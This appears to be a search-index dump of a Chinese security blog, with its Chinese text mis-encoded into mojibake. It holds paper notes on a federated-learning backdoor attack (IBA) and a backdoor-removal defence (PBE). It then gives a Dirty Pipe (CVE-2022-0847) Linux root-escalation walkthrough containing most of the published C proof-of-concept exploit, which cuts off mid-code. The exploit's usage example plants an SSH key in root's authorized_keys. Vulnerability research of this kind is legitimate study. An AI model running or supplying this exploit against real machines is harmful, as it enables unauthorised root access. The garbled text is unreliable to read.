æ•ˆçš„ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæå‡ºäº†åˆ©ç”¨å†å²æ¢¯åº¦å˜åŒ–é€‰æ‹©ä¸å¸¸æ›´æ–°çš„ç¥ç»å…ƒä½œä¸ºæ±¡æŸ“ç»´åº¦çš„æ–¹æ³•ã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š\né€‰æ‹©ç»´åº¦ï¼šè®¡ç®—æ¢¯åº¦å‘é‡gçš„åº•éƒ¨k%åæ ‡ï¼Œè¿™äº›åæ ‡æ˜¯åŸºäºåœ¨å¹²å‡€æ•°æ® Dä¸Šå­¦ä¹ ä¸»è¦ä»»åŠ¡å¾—åˆ°çš„æ¢¯åº¦ã€‚\næ•°å­¦è¡¨è¾¾ï¼š $$ \\beta_t \\larr \\frac{p-1}{p}*\\beta + \\frac{1}{p} * \\beta \\text \\quad{ä½¿å¾—} \\quad \\beta_t=bottom_k(g_t) $$\nå…¶ä¸­ pæ˜¯åˆ°ç¬¬ tè½®ä¸ºæ­¢ï¼Œæ”»å‡»è€…è¢«é€‰ä¸­å‚ä¸ FL è®­ç»ƒçš„è½®æ•°ã€‚\næŠ•å½±æ¢¯åº¦ï¼šå½“å®Œæˆæœ¬åœ°æ¨¡å‹ $f_w$çš„æ¢¯åº¦è®¡ç®— $\\hat{g}$åï¼Œæ”»å‡»è€…å°†æ¢¯åº¦æŠ•å½±åˆ° $\\hat{g}$çš„åæ ‡çº¦æŸä¸Šï¼Œåªé’ˆå¯¹åº•éƒ¨k%çš„åæ ‡è¿›è¡Œæ±¡æŸ“ã€‚\nè¿™æ ·ï¼Œåªæœ‰åº•éƒ¨k%çš„åæ ‡è¢«æ±¡æŸ“ï¼Œè¿™å¯ä»¥å»¶é•¿åé—¨æ•ˆæœï¼Œå› ä¸ºå…¶ä»–è‰¯æ€§å®¢æˆ·ç«¯å¾ˆå°‘æ›´æ–°è¿™äº›åæ ‡ã€‚åˆ©ç”¨å†å²ä¿¡æ¯å¸®åŠ©ç¡®å®šæ¯ä¸€è½®çš„åº•éƒ¨k%åæ ‡ï¼Œéšç€è½®æ¬¡çš„æ¨è¿›å’Œæœ¬åœ°å®¢æˆ·ç«¯æ¨¡å‹å‘å…¨å±€æ¨¡å‹çš„æ”¶æ•›ï¼Œè¿™ä¸€ä¿¡æ¯å˜å¾—æ›´åŠ é‡è¦ã€‚\nExperiments æ•°æ®é›†ï¼šCIFARã€MNISTã€Tiny ImageNet\n1.ä¸åŒæ”»å‡»åœºæ™¯ï¼šä¸åŒè”é‚¦èšåˆæ–¹æ³•ï¼š\n2.ä¸åŒé˜²å¾¡æ–¹æ³•ï¼š\n3.ä¸å¯æ„ŸçŸ¥æ€§ï¼š\nå‰ä¸¤è¡Œæ˜¯è‰¯æ€§å›¾åƒï¼Œåä¸¤è¡Œæ˜¯åé—¨å›¾åƒ\n4.æŒä¹…æ€§ï¼š\nFuture Directions ç”Ÿæˆè‡ªChatGPTï¼š\nå¼€å‘å¯¹æŠ—è”é‚¦å­¦ä¹ åé—¨æ”»å‡»çš„é˜²å¾¡æœºåˆ¶ï¼šç”±äºè”é‚¦å­¦ä¹ æ˜¯åˆ†å¸ƒå¼å’Œå»ä¸­å¿ƒåŒ–çš„ï¼Œè¿™ä¸€ç‰¹ç‚¹å¸¦æ¥äº†ç‹¬ç‰¹çš„æŒ‘æˆ˜ã€‚å› æ­¤ï¼Œéœ€è¦å¼€å‘é’ˆå¯¹è¿™ç§ç‰¹æ®Šç¯å¢ƒçš„é²æ£’é˜²å¾¡æœºåˆ¶ï¼Œä»¥æœ‰æ•ˆåº”å¯¹åé—¨æ”»å‡»ã€‚ å°†æ–¹æ³•æ¨å¹¿è‡³å¤šæ ·åŒ–çš„è”é‚¦å­¦ä¹ åœºæ™¯ï¼šå°†æœ¬æ–‡æå‡ºçš„æ–¹æ³•æ¨å¹¿è‡³å…·æœ‰å¼‚æ„æ•°æ®ï¼ˆå¦‚éç‹¬ç«‹åŒåˆ†å¸ƒæ•°æ®ï¼‰çš„è”é‚¦å­¦ä¹ è®¾ç½®ä¸­ï¼Œä»¥æ›´å…¨é¢åœ°ç†è§£æ”»å‡»çš„æœ‰æ•ˆæ€§ã€‚ æ¢ç´¢æ›¿ä»£çš„è§¦å‘å™¨åŠå…¶åœ¨éšè”½æ€§å’ŒæˆåŠŸç‡ä¸Šçš„å½±å“ï¼šç ”ç©¶ä¸åŒç±»å‹çš„è§¦å‘å™¨ï¼Œåˆ†æå®ƒä»¬åœ¨æé«˜æ”»å‡»éšè”½æ€§å’ŒæˆåŠŸç‡æ–¹é¢çš„ä½œç”¨ï¼Œä»è€Œè·å–æ›´å¤šæœ‰ä»·å€¼çš„è§è§£ã€‚ åœ¨æ›´å¤§è§„æ¨¡å’Œå®é™…åœºæ™¯ä¸­è¯„ä¼°æ¡†æ¶ï¼šåœ¨æ›´å¤§è§„æ¨¡çš„è”é‚¦å­¦ä¹ ç³»ç»Ÿå’Œç°å®åœºæ™¯ä¸­è¯„ä¼°è¯¥æ¡†æ¶ï¼Œä»¥æ£€éªŒå…¶å¯æ‰©å±•æ€§å’Œå®ç”¨æ€§ã€‚ æ¨è¿›å¯¹æŠ—é˜²å¾¡ç­–ç•¥ï¼šç ”ç©¶åŒ…æ‹¬ä¸»åŠ¨æ£€æµ‹å’Œç¼“è§£æŠ€æœ¯åœ¨å†…çš„å¯¹æŠ—é˜²å¾¡ç­–ç•¥ï¼Œä¸ºæ›´å®‰å…¨ã€å€¼å¾—ä¿¡èµ–çš„è”é‚¦å­¦ä¹ ç³»ç»Ÿåšå‡ºè´¡çŒ®ã€‚ ","date":"2024-10-23T13:34:53+08:00","permalink":"https://k1te.cn/p/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BBiba-towards-irreversible-backdoor-attacks-in-federated-learning/","title":"ã€è®ºæ–‡é˜…è¯»ã€‘IBA: Towards Irreversible Backdoor Attacks in Federated Learning"},{"content":"Info CVPR 2023\nXiâ€™an Jiaotong Universityã€Xidian University\nä»£ç åœ°å€ï¼šhttps://github.com/John-niu-07/BPE\nAbstract ä¼—æ‰€å‘¨çŸ¥ï¼Œæ·±åº¦ç¥ç»ç½‘ç»œ(DNN)æ—¢å®¹æ˜“å—åˆ°åé—¨æ”»å‡»ï¼Œä¹Ÿå®¹æ˜“å—åˆ°å¯¹æŠ—æ”»å‡»ã€‚åœ¨æ–‡çŒ®ä¸­ï¼Œè¿™ä¸¤ç±»æ”»å‡»é€šå¸¸è¢«è§†ä¸ºä¸åŒçš„é—®é¢˜å¹¶åˆ†åˆ«è§£å†³ï¼Œå› ä¸ºå®ƒä»¬åˆ†åˆ«å±äºè®­ç»ƒæ—¶æ”»å‡»å’Œæ¨ç†æ—¶æ”»å‡»ã€‚ç„¶è€Œï¼Œåœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å‘ç°äº†å®ƒä»¬ä¹‹é—´ä¸€ä¸ªæœ‰è¶£çš„è”ç³»ï¼šå¯¹äºä¸€ä¸ªæ¤å…¥åé—¨çš„æ¨¡å‹ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°å…¶å¯¹æŠ—æ ·æœ¬ä¸å…¶åé—¨å›¾åƒå…·æœ‰ç›¸ä¼¼çš„è¡Œä¸ºï¼Œå³ä¸¤è€…éƒ½æ¿€æ´»äº†ç›¸åŒçš„DNNç¥ç»å…ƒå­é›†ã€‚å®ƒè¡¨æ˜ï¼Œåœ¨æ¨¡å‹ä¸­æ¤å…¥åé—¨å°†æ˜¾è‘—å½±å“æ¨¡å‹çš„å¯¹æŠ—æ ·æœ¬ã€‚åŸºäºè¿™äº›è§‚å¯Ÿç»“æœï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§æ–°çš„æ¸è¿›å¼åé—¨æ“¦é™¤(Progressive Backdoor Erasing, PBE)ç®—æ³•ï¼Œé€šè¿‡åˆ©ç”¨éç›®æ ‡å¯¹æŠ—æ€§æ”»å‡»æ¥é€æ­¥å‡€åŒ–å—æ„ŸæŸ“çš„æ¨¡å‹ã€‚ä¸ä»¥å‰çš„åé—¨é˜²å¾¡æ–¹æ³•ä¸åŒï¼Œæˆ‘ä»¬æ–¹æ³•çš„ä¸€ä¸ªæ˜¾è‘—ä¼˜åŠ¿æ˜¯ï¼Œå³ä½¿åœ¨å¹²å‡€çš„é¢å¤–æ•°æ®é›†ä¸å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œå®ƒä¹Ÿå¯ä»¥æ“¦é™¤åé—¨ã€‚æˆ‘ä»¬çš„å®éªŒè¡¨æ˜ï¼Œå¯¹äº5ç§æœ€å…ˆè¿›çš„åé—¨æ”»å‡»ï¼Œæˆ‘ä»¬çš„PBEå¯ä»¥æœ‰æ•ˆåœ°æ“¦é™¤åé—¨ï¼Œè€Œå¯¹å¹²å‡€çš„æ ·æœ¬æ²¡æœ‰æ˜æ˜¾çš„æ€§èƒ½ä¸‹é™ï¼Œå¹¶ä¸”æ€§èƒ½ä¼˜äºç°æœ‰çš„é˜²å¾¡æ–¹æ³•ã€‚\nKey Insight ç°åœ¨æœ‰ä¸¤ä¸ªæ¨¡å‹ï¼Œä¸€ä¸ªæ˜¯å¹²å‡€æ¨¡å‹benignï¼Œä¸€ä¸ªæ˜¯è¢«æ¤å…¥äº†WaNetåé—¨çš„infected(æ— è®ºæ˜¯ä¸€ä¸ªAll-to-Allæ¨¡å‹è¿˜æ˜¯åä¸ªAll-to-Oneæ¨¡å‹ç»“æœéƒ½æ˜¾è‘—ï¼Œè§åŸæ–‡4.3)ï¼Œç„¶åä½¿ç”¨10000å¼ éšæœºçš„CIFAR-10å›¾åƒå¯¹è¿™ä¸¤ä¸ªæ¨¡å‹åˆ†åˆ«è¿›è¡Œå¯¹æŠ—æ”»å‡»ï¼Œç»“æœå‘ç°å¾—åˆ°çš„ç»“æœæˆªç„¶ä¸åŒï¼šå¯¹äºbenignæ¨¡å‹ï¼Œå¦‚ä¸‹å›¾çš„(a)æ‰€ç¤ºï¼Œå¯¹æŠ—æ ·æœ¬è¢«éšæœºå‡åŒ€åœ°åˆ†ç±»ä¸ºä¸åŒçš„labelï¼Œè€Œå¯¹äºinfectedæ¨¡å‹æ¥è¯´ï¼Œå¯¹æŠ—æ ·æœ¬è¢«åˆ†ç±»çš„labelä¸åé—¨çš„target labelé«˜åº¦ç›¸å…³ï¼Œå¦‚å›¾(b)æ‰€ç¤ºï¼Œä¸å…¶ä»–ç±»åˆ«ç›¸æ¯”ï¼Œå®ƒæ›´æœ‰å¯èƒ½è¢«åˆ†ç±»ä¸ºç›®æ ‡ç±»ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œåé—¨æ ·æœ¬ä¹Ÿä¼šè¢«åé—¨æ¨¡å‹åˆ†ç±»ä¸ºtarget labelï¼ˆåºŸè¯ï¼‰ï¼Œå› æ­¤åé—¨æ¨¡å‹çš„å¯¹æŠ—æ ·æœ¬å¯ä»¥è§†ä¸ºå…¶åé—¨æ ·æœ¬ï¼Œä¹Ÿå°±æ˜¯åŸæ–‡æ‰€è¯´çš„\u0026quot;åé—¨æ¨¡å‹çš„å¯¹æŠ—æ ·æœ¬ä¸å…¶åé—¨å›¾åƒå…·æœ‰ç›¸ä¼¼çš„è¡Œä¸º\u0026quot;ã€‚\nä¸ºäº†è¿›ä¸€æ­¥éªŒè¯ä½œè€…çš„çŒœæƒ³ï¼Œä½œè€…æµ‹é‡äº†ä¸åŒå›¾åƒä¹‹é—´çš„ç‰¹å¾ç›¸ä¼¼åº¦ï¼Œå¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬æœ‰å¹²å‡€å›¾åƒxï¼Œå¹²å‡€æ¨¡å‹çš„å¯¹æŠ—æ ·æœ¬$\\widetilde x$ï¼Œåé—¨æ¨¡å‹çš„å¯¹æŠ—æ ·æœ¬$\\widetilde x ^{\\prime}$ï¼Œä»¥åŠåé—¨å›¾åƒ$x^t$ï¼Œé€šè¿‡æ¯”è¾ƒä»–ä»¬ç‰¹å¾å›¾çš„$l_2$è·ç¦»ï¼Œæ˜¾ç„¶ï¼Œåé—¨å›¾åƒ$x^t$å’Œ$\\widetilde x ^{\\prime}$çš„è·ç¦»è¿œå°äºå®ƒå’Œå¯¹æŠ—æ ·æœ¬$\\widetilde x ^{\\prime}$ä¹‹é—´çš„è·ç¦»ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å°†åé—¨æ¨¡å‹çš„å¯¹æŠ—æ ·æœ¬$\\widetilde x ^{\\prime}$å½“ä½œåé—¨å›¾åƒ$x^t$æ¥ä½¿ç”¨ï¼Œè¿™æ˜¯æœ¬æ–‡çš„æ–¹æ³•çš„æ ¸å¿ƒã€‚å¯¹äºè¿™ä¸€å‘ç°ï¼Œä½œè€…ç»™å‡ºçš„è§£é‡Šæ˜¯ï¼šâ€œå½“åé—¨æ¤å…¥æ¨¡å‹æ—¶ï¼Œä¸€äº›DNNç¥ç»å…ƒä¼šè¢«è§¦å‘æ¿€æ´»ï¼Œç§°ä¸ºâ€™åé—¨ç¥ç»å…ƒâ€˜ã€‚å½“å¯¹å—æ„ŸæŸ“çš„æ¨¡å‹è¿›è¡Œå¯¹æŠ—æ”»å‡»æ—¶ï¼Œè¿™äº›â€˜åé—¨ç¥ç»å…ƒâ€™æ›´æœ‰å¯èƒ½åœ¨ç”Ÿæˆå¯¹æŠ—æ€§ç¤ºä¾‹æ—¶è¢«é€‰æ‹©/é”å®šå’Œæ¿€æ´»ã€‚â€\nTheoretical Analysis å‡è®¾æœ‰ä¸€ä¸ªçº¿æ€§æ¨¡å‹ï¼Œæƒé‡ä¸º$W=(w_1,w_2,\u0026hellip;,w_K)$ï¼Œåé—¨æ¨¡å‹çš„æƒé‡åˆ™ä¸º$\\widetilde W ^\\ast=(\\widetilde w_1,\\widetilde w_2,\u0026hellip;,\\widetilde w_K)$ï¼Œåé—¨å›¾åƒä¸º$x^t = x + P$ï¼Œå‡è®¾åœ¨æ‰°åŠ¨$\\tau \u0026gt; 0$çš„å½±å“ä¸‹æˆ‘ä»¬çš„çº¿æ€§æ¨¡å‹ä¹Ÿå¯ä»¥æ­£ç¡®åˆ†ç±»ï¼Œå¹¶ä¸”è¿™ä¸ª$\\tau$è¶³å¤Ÿå¤§ï¼Œä»¥è‡³äºå°æ‰°åŠ¨ä¸å½±å“åˆ†ç±»ç»“æœã€‚\nåœ¨ä¸Šé¢çš„å‡è®¾ä¸‹ï¼Œæˆ‘ä»¬æœ‰æ‰°åŠ¨$r$ï¼Œä»¥åŠå…¶åœ¨Pæ–¹å‘ä¸Šçš„æŠ•å½±$r_ \\perp$ï¼Œé‚£ä¹ˆå®ƒæœ‰ä¸‹ç•Œï¼š\nä¸Šè¿°å…¬å¼å¯ä»¥çœ‹å‡ºï¼Œå½“å°†æ‰°åŠ¨$r$æŠ•å½±åœ¨è§¦å‘Pçš„æ–¹å‘ä¸Šæ—¶ï¼ŒæŠ•å½±$r_ \\perp$åœ¨å®Œæ•´çš„æ‰°åŠ¨$r$ä¸­å æ®äº†é‡è¦çš„éƒ¨åˆ†ã€‚è¿™æ„å‘³ç€æ‰°åŠ¨$r$ä¸è§¦å‘Péå¸¸ç›¸ä¼¼ï¼Œè¿™è¯æ˜äº†æˆ‘ä»¬çš„è§‚å¯Ÿæ˜¯åˆç†çš„ã€‚\nThread Model å‡è®¾æ”»å‡»è€…å¯ä»¥æ§åˆ¶è®­ç»ƒæ•°æ®å¹¶ä¸”å·²ç»å°†åé—¨æ¤å…¥åˆ°æ¨¡å‹ä¹‹ä¸­ã€‚\nåœ¨æœ¬æ–‡ä¸­ï¼Œæœ‰ä¸¤ç§é˜²å¾¡è®¾å®šã€‚ä¸€ç§ç±»ä¼¼äºå…¶ä»–â€æ¨¡å‹ä¿®å¤â€œï¼Œæ‹¥æœ‰æ„ŸæŸ“æ¨¡å‹å’Œä¸€ä¸ªé¢å¤–çš„å¹²å‡€æ•°æ®é›†ï¼Œè¿˜æœ‰ä¸€ç§ç±»ä¼¼äºâ€æ•°æ®è¿‡æ»¤â€œï¼Œå¯ä»¥è®¿é—®è®­ç»ƒæ•°æ®é›†ï¼Œä½†æ˜¯æ²¡æœ‰é¢å¤–çš„å¹²å‡€æ•°æ®é›†ã€‚\nMethod å¦‚ç®—æ³•1æ‰€ç¤ºï¼Œæ¸è¿›å¼åé—¨æ“¦é™¤PBEå¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰æ­¥ï¼Œå‡è®¾ç°åœ¨å¯ä»¥è®¿é—®è®­ç»ƒæ•°æ®é›†ä½†æ˜¯æ²¡æœ‰é¢å¤–çš„å¹²å‡€æ•°æ®é›†ã€‚\né¦–å…ˆï¼Œä»è®­ç»ƒé›†ä¸­éšæœºé‡‡æ ·ä¸€äº›å›¾åƒ(å¯èƒ½æœ‰åé—¨å›¾åƒä¹Ÿå¯èƒ½æœ‰å¹²å‡€å›¾åƒ)ä½œä¸ºåˆå§‹æ•°æ®é›†$D_{ext}^0$ï¼Œç„¶ååˆ©ç”¨è¿™äº›å›¾åƒå¯¹åé—¨æ¨¡å‹$\\theta^{\\prime}$è¿›è¡Œæ— ç›®æ ‡å¯¹æŠ—æ”»å‡»ï¼Œå¾—åˆ°ç›¸åº”çš„å¯¹æŠ—æ ·æœ¬$\\widetilde x ^{\\prime}$ï¼Œåœ¨å‰é¢çš„key insightä¸­æˆ‘ä»¬å·²ç»å‘ç°åé—¨æ¨¡å‹çš„å¯¹æŠ—æ ·æœ¬$\\widetilde x ^{\\prime}$å¯ä»¥è§†ä¸ºåé—¨å›¾åƒ$x^t$ï¼Œä¹Ÿå°±è¯´æˆ‘ä»¬ç°åœ¨å¾—åˆ°äº†æ ‡ç­¾æ˜¯å¹²å‡€çš„åé—¨å›¾åƒï¼ˆç”±äºç›®å‰çš„åé—¨æ”»å‡»ä¸­æŠ•æ¯’ç‡å·²ç»è¶Šæ¥è¶Šä½ï¼Œå› æ­¤æŠ½å–çš„å›¾åƒå…¨æ˜¯åé—¨å›¾åƒçš„æ¦‚ç‡å¹¶ä¸å¤§ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™äº›å›¾åƒå°†åé—¨æ¨¡å‹ä¹‹å‰å­¦ä¹ çš„åé—¨ä¿¡æ¯â€çº æ­£è¿‡æ¥â€œï¼Œäºæ˜¯å¼€å§‹ç¬¬ä¸€æ¬¡fine-tuningï¼Œè¿™ä¸€æ­¥ç›®çš„æ˜¯ä¸ºäº†é™ä½ASRã€‚ åœ¨ç¬¬tæ¬¡è¿­ä»£ä¸­æˆ‘ä»¬æœ‰é¢å¤–æ•°æ®é›†$D_{ext}^t$ï¼Œå‰é¢è¯´è¿‡è¿™ä¸ªæ•°æ®é›†ä»è®­ç»ƒé›†ä¸­éšæœºé‡‡æ ·å¾—åˆ°ï¼Œå› æ­¤æœ‰ä¸€éƒ¨åˆ†å›¾åƒæ˜¯å¹²å‡€çš„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™äº›å›¾åƒè¿›è¡Œç¬¬äºŒæ¬¡fine-tuningï¼Œè¿™ä¸€æ­¥çš„ç›®çš„æ˜¯æé«˜ACCã€‚ é¢å¤–æ•°æ®é›†$D_{ext}^t$ä¸­æ˜¾ç„¶ä¼šæœ‰åé—¨å›¾åƒï¼Œè¿™äº›å›¾åƒæ— è®ºæ˜¯å¯¹äºç¬¬ä¸€æ­¥é™ä½ASRè¿˜æ˜¯ç¬¬äºŒæ­¥æé«˜ACCéƒ½ä¼šäº§ç”Ÿè´Ÿé¢å½±å“ï¼Œå› æ­¤è¿™ä¸€æ­¥çš„ç›®çš„æ˜¯å°½å¯èƒ½å‰”é™¤$D_{ext}^t$ä¸­çš„åé—¨å›¾åƒï¼Œå¾—åˆ°æ›´å¹²å‡€çš„$D_{ext}^{t+1}$ã€‚è¿™ä¸€æ­¥çš„åŸç†æ˜¯æˆ‘ä»¬æœ‰åŸå§‹çš„åé—¨æ¨¡å‹$\\theta^{\\prime}$ï¼Œè¿˜æœ‰ä¸€ä¸ªä¸Šä¸€æ­¥å¾—åˆ°çš„æ›´åŠ å¹²å‡€çš„æ¨¡å‹$\\theta^{t}$ï¼Œæ˜¾ç„¶åé—¨å›¾åƒåœ¨è¿™ä¸¤ä¸ªæ¨¡å‹ä¸­çš„è¡¨ç°ä¸åŒï¼Œè€Œå¹²å‡€å›¾åƒåˆ™åº”è¯¥è¡¨ç°ä¸€è‡´ï¼Œç”±äºæ¨¡å‹$\\theta^{t}$ä¸ä¸€å®šè¶³å¤Ÿå¹²å‡€ï¼Œå› æ­¤æ ¹æ®æ¨¡å‹è¾“å‡ºçš„æ¯ä¸ªç±»åˆ«çš„æ¦‚ç‡è¿›è¡Œåˆ¤æ–­ï¼Œè€Œä¸æ˜¯ä»…ä»…çœ‹predicted labelï¼Œè‡³æ­¤ï¼Œæˆ‘ä»¬å¾—åˆ°æ›´åŠ å¹²å‡€çš„æ•°æ®é›†$D_{ext}^{t+1}$ï¼Œå›åˆ°ç¬¬ä¸€æ­¥ï¼Œè¿›è¡Œä¸‹ä¸€è½®è¿­ä»£ï¼Œæœ€ç»ˆå¾—åˆ°å‡€åŒ–æ¨¡å‹$\\theta^{T}$â€‹ã€‚ å¦‚æœæ˜¯ç¬¬ä¸€ç§æœ‰é¢å¤–çš„å¹²å‡€æ•°æ®é›†çš„è®¾å®šï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥è·³è¿‡ç¬¬ä¸‰æ­¥ï¼Œåªéœ€è¦è¿è¡Œç¬¬ä¸€æ­¥å’Œç¬¬äºŒæ­¥ä¸€æ¬¡å³å¯ï¼Œç§°ä¹‹ä¸ºå¯¹æŠ—å¾®è°ƒ(Adversarial Fine-Tuning, AFT)ã€‚\nExperiment å¯¹æ¯”äº†è‹¥å¹²é˜²å¾¡æ–¹æ³•åœ¨è‹¥å¹²æ”»å‡»æ–¹æ³•ä¸Šé¢çš„æ•ˆæœï¼Œæ•°æ®é›†åªæœ‰ä¸¤ä¸ªï¼Œåˆ†åˆ«æ˜¯CIFAR-10å’ŒGTSRBï¼Œç»“æœå¦‚ä¸‹ï¼š\n","date":"2024-10-11T17:28:36+08:00","permalink":"https://k1te.cn/p/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BBprogressive-backdoor-erasing-via-connecting-backdoor-and-adversarial-attacks/","title":"ã€è®ºæ–‡é˜…è¯»ã€‘Progressive Backdoor Erasing via connecting Backdoor and Adversarial Attacks"},{"content":"ç®€ä»‹ æ”»å‡»è€…é€šè¿‡åˆ©ç”¨æ­¤æ¼æ´ï¼Œå¯è¦†ç›–é‡å†™ä»»æ„å¯è¯»æ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œä»è€Œå¯å°†æ™®é€šæƒé™çš„ç”¨æˆ·æå‡åˆ°ç‰¹æƒ rootã€‚CVE-2022-0847 çš„æ¼æ´åŸç†ç±»ä¼¼äº CVE-2016-5195 è„ç‰›æ¼æ´ï¼ˆDirty Cowï¼‰ï¼Œä½†å®ƒæ›´å®¹æ˜“è¢«åˆ©ç”¨ã€‚æ¼æ´ä½œè€…å°†æ­¤æ¼æ´å‘½åä¸ºâ€œDirty Pipeâ€\næ¼æ´ç¼–å·ï¼šCVE-2022-0847\nå½±å“ç‰ˆæœ¬ï¼š Linuxå†…æ ¸ 5.8 åŠä¹‹åç‰ˆæœ¬\nç¯å¢ƒé…ç½® Ubuntu20.04é»˜è®¤å†…æ ¸ç‰ˆæœ¬æ˜¯5.4ï¼š\n1 2 root@ee399f8033c1:/# uname -r 5.4.0-100-generic æˆ‘ä»¬éœ€è¦å®‰è£…5.8åŠä»¥ä¸Šçš„å†…æ ¸ï¼Œå½“ç„¶ç›´æ¥ä¸‹è½½å†…æ ¸ç‰ˆæœ¬æ¯”è¾ƒé«˜çš„å‘è¡Œç‰ˆä¹Ÿå¯ä»¥ï¼Œæ¯”å¦‚kaliã€‚\næˆ‘ä»¬å¯ä»¥å»Index of /~kernel-ppa/mainline (ubuntu.com)æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„å†…æ ¸ï¼Œè¿™é‡Œé€‰çš„5.16çš„:\nä¸‹è½½ï¼š\n1 wget https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.16/amd64/linux-image-unsigned-5.16.0-051600-generic_5.16.0-051600.202201092355_amd64.deb https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.16/amd64/linux-modules-5.16.0-051600-generic_5.16.0-051600.202201092355_amd64.deb å®‰è£…ï¼š\n1 dpkg -i linux*.deb æ›´æ–°grubç³»ç»Ÿå¼•å¯¼å¹¶é‡å¯:\n1 2 update-grub reboot POC1 ç¬¬ä¸€ä¸ªæ˜¯ä½œè€…è‡ªå·±å‘è¡¨çš„ï¼šThe Dirty Pipe Vulnerability\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 /* SPDX-License-Identifier: GPL-2.0 */ /* * Copyright 2022 CM4all GmbH / IONOS SE * * author: Max Kellermann \u0026lt;max.kellermann@ionos.com\u0026gt; * * Proof-of-concept exploit for the Dirty Pipe * vulnerability (CVE-2022-0847) caused by an uninitialized * \u0026#34;pipe_buffer.flags\u0026#34; variable. It demonstrates how to overwrite any * file contents in the page cache, even if the file is not permitted * to be written, immutable or on a read-only mount. * * This exploit requires Linux 5.8 or later; the code path was made * reachable by commit f6dd975583bd (\u0026#34;pipe: merge * anon_pipe_buf*_ops\u0026#34;). The commit did not introduce the bug, it was * there before, it just provided an easy way to exploit it. * * There are two major limitations of this exploit: the offset cannot * be on a page boundary (it needs to write one byte before the offset * to add a reference to this page to the pipe), and the write cannot * cross a page boundary. * * Example: ./write_anything /root/.ssh/authorized_keys 1 $\u0026#39;\\nssh-ed25519 AAA......\\n\u0026#39; * * Further explanation: https://dirtypipe.cm4all.com/ */ #define _GNU_SOURCE #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/user.h\u0026gt; #ifndef PAGE_SIZE #define PAGE_SIZE 4096 #endif /** * Create a pipe where all \u0026#34;bufs\u0026#34; on the pipe_inode_info ring have the * PIPE_BUF_FLAG_CAN_MERGE flag set. */ static void prepare_pipe(int p[2]) { if (pipe(p)) abort(); const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ); static char buffer[4096]; /* fill the pipe completely; each pipe_buffer will now have the PIPE_BUF_FLAG_CAN_MERGE flag */ for (unsigned r = pipe_size; r \u0026gt; 0;) { unsigned n = r \u0026gt; sizeof(buffer) ? sizeof(buffer) : r; write(p[1], buffer, n); r -= n; } /* drain the pipe, freeing all pipe_buffer instances (but leaving the flags initialized) */ for (unsigned r = pipe_size; r \u0026gt; 0;) { unsigned n = r \u0026gt; sizeof(buffer) ? sizeof(buffer) : r; read(p[0], buffer, n); r -= n; } /* the pipe is now empty, and if somebody adds a new pipe_buffer without initializing its \u0026#34;flags\u0026#34;, the buffer will be mergeable */ } int main(int argc, char **argv) { if (argc != 4) { fprintf(stderr, \u0026#34;Usage: %s TARGETFILE OFFSET DATA\\n\u0026#34;, argv[0]); return EXIT_FAILURE; } /* dumb command-line argument parser */ const char *const path = argv[1]; loff_t offset = strtoul(argv[2], NULL, 0); const char *const data = argv[3]; const size_t data_size = strlen(data); if (offset % PAGE_SIZE == 0) { fprintf(stderr, \u0026#34;Sorry, cannot start writing at a page boundary\\n\u0026#34;); return EXIT_FAILURE; } const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1; const loff_t end_offset = offset + (loff_t)data_size; if (end_offset \u0026gt; next_page) { fprintf(stderr, \u0026#34;Sorry, cannot write across a page boundary\\n\u0026#34;); return EXIT_FAILURE; } /* open the input file and validate the specified offset */ const int fd = open(path, O_RDONLY); // yes, read-only! :-) if (fd \u0026lt; 0) { perror(\u0026#34;open failed\u0026#34;); return EXIT_FAILURE; } struct stat st; if (fstat(fd, \u0026amp;st)) { perror(\u0026#34;stat failed\u0026#34;); return EXIT_FAILURE; } if (offset \u0026gt; st.st_size) { fprintf(stderr, \u0026#34;Offset is not inside the file\\n\u0026#34;); return EXIT_FAILURE; } if (end_offset \u0026gt; st.st_size) { fprintf(stderr, \u0026#34;Sorry, cannot enlarge the file\\n\u0026#34;); return EXIT_FAILURE; } /* create the pipe with all flags initialized with PIPE_BUF_FLAG_CAN_MERGE */ int p[2]; prepare_pipe(p); /* splice one byte from before the specified offset into the pipe; this will add a reference to the page cache, but since copy_page_to_iter_pipe() does not initialize the \u0026#34;flags\u0026#34;, PIPE_BUF_FLAG_CAN_MERGE is still set */ --offset; ssize_t nbytes = splice(fd, \u0026amp;offset, p[1], NULL, 1, 0); if (nbytes \u0026lt; 0) { perror(\u0026#34;splice failed\u0026#34;); return EXIT_FAILURE; } if (nbytes == 0) { fprintf(stderr, \u0026#34;short 